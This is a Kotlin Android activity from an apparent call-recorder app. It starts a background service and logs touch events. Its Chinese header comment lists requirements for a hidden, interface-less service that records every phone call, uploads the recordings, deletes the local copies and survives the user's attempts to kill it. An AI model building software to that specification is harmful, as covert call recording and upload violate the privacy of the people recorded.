package com.toy.qiaodata.callrecoder

import android.content.Intent
import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.MotionEvent

/**
 * 通话录音
 * 需求：
 * 1.无界面，只一个service
 * 2.监听用户通话，自动录音
 * 3.录音自动压缩上传，上传成功后，删除本地文件
 * 4.用户清理进程时，service不会被杀死
 * 5.稳定性，无网络，上传失败，服务报错。
 */
class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        var intent = Intent(this, PlayerService::class.java)
        startService(intent)
    }

    override fun dispatchTouchEvent(event: MotionEvent): Boolean {
        Log.i("MainActivity", "dispatchTouchEvent start")
        val b = super.dispatchTouchEvent(event)
        Log.i("MainActivity", "dispatchTouchEvent end return: " + b)
        return b
    }

    override fun onTouchEvent(event: MotionEvent): Boolean {
        val b = true
        Log.i("MainActivity", "onTouchEvent return: " + b)
        return b
    }
}
